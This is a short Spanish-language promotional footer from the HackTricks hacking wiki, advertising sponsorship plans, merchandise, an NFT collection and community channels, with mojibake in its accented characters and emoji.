* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
